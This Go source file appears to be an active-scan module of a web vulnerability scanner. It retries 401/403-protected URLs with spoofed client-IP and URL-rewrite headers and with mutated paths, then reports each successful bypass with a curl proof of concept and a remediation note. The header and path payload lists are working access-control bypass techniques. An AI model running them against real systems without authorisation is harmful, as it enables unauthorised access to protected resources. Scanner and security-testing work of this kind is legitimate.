package activescan

import (
	"fmt"
	"io"
	"net/http"
	"strings"

	"github.com/mijelblack677-ctrl/aegis/internal/modules"
	"github.com/mijelblack677-ctrl/aegis/internal/output"
)

type ForbiddenBypasser struct {
	bypassHeaders map[string]string
	pathBypasses  []func(string) string
}

func NewForbiddenBypasser() *ForbiddenBypasser {
	return &ForbiddenBypasser{
		bypassHeaders: map[string]string{
			"X-Forwarded-For":       "127.0.0.1",
			"X-Real-IP":             "127.0.0.1",
			"X-Originating-IP":      "127.0.0.1",
			"X-Forwarded-Host":      "localhost",
			"X-Original-URL":        "/admin",
			"X-Rewrite-URL":         "/admin",
			"X-Custom-IP-Authorization": "127.0.0.1",
			"Client-IP":             "127.0.0.1",
			"X-ProxyUser-Ip":        "127.0.0.1",
			"X-Host":                "127.0.0.1",
			"X-Forwarded-Server":    "localhost",
		},
		pathBypasses: []func(string) string{
			func(p string) string { return p + "/" },
			func(p string) string { return p + ";" },
			func(p string) string { return p + "..;/" },
			func(p string) string { return p + "%2f" },
			func(p string) string { return p + "%2e" },
			func(p string) string { return strings.Replace(p, "/", "//", -1) },
			func(p string) string { return "/." + p },
		},
	}
}

func (fb *ForbiddenBypasser) Name() string    { return "forbidden_bypasser" }
func (fb *ForbiddenBypasser) IsPassive() bool { return false }

func (fb *ForbiddenBypasser) Run(pair *modules.RequestResponsePair) ([]*output.Vulnerability, error) {
	var vulns []*output.Vulnerability

	if pair.Response == nil {
		return vulns, nil
	}

	// Only test 403/401 responses
	if pair.Response.StatusCode != 403 && pair.Response.StatusCode != 401 {
		return vulns, nil
	}

	urlStr := pair.Request.URL.String()
	method := pair.Request.Method
	client := &http.Client{
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	// Test header-based bypasses
	for header, value := range fb.bypassHeaders {
		req, _ := http.NewRequest(method, urlStr, nil)
		copyHeaders(pair.Request, req)
		req.Header.Set(header, value)

		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		body, _ := io.ReadAll(resp.Body)
		resp.Body.Close()

		if resp.StatusCode != 403 && resp.StatusCode != 401 {
			vulns = append(vulns, &output.Vulnerability{
				Name:        fmt.Sprintf("403 Bypass via %s Header", header),
				Description: fmt.Sprintf("Access to %s was bypassed using header '%s: %s'. Response: %d", urlStr, header, value, resp.StatusCode),
				Severity:    output.SeverityHigh,
				URL:         urlStr,
				Method:      method,
				Evidence: output.Evidence{
					Request:        fmt.Sprintf("%s: %s", header, value),
					Response:       string(body[:min(200, len(body))]),
					ProofOfConcept: fmt.Sprintf("curl -H '%s: %s' '%s'", header, value, urlStr),
				},
				Remediation: "Ensure authorization checks are performed server-side and not based on client-supplied headers.",
				Tags:        []string{"403-bypass", "auth-bypass", "goldmine"},
			})
			return vulns, nil
		}
	}

	// Test path-based bypasses
	for _, pathFunc := range fb.pathBypasses {
		newPath := pathFunc(pair.Request.URL.Path)
		newURL := strings.Replace(urlStr, pair.Request.URL.Path, newPath, 1)

		req, _ := http.NewRequest(method, newURL, nil)
		copyHeaders(pair.Request, req)

		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		resp.Body.Close()

		if resp.StatusCode != 403 && resp.StatusCode != 401 {
			vulns = append(vulns, &output.Vulnerability{
				Name:        "403 Bypass via Path Manipulation",
				Description: fmt.Sprintf("Access bypassed using path: %s", newPath),
				Severity:    output.SeverityHigh,
				URL:         newURL,
				Method:      method,
				Evidence: output.Evidence{
					ProofOfConcept: fmt.Sprintf("curl '%s'", newURL),
				},
				Remediation: "Normalize all URL paths before authorization checks.",
				Tags:        []string{"403-bypass", "path-traversal"},
			})
		}
	}

	return vulns, nil
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}
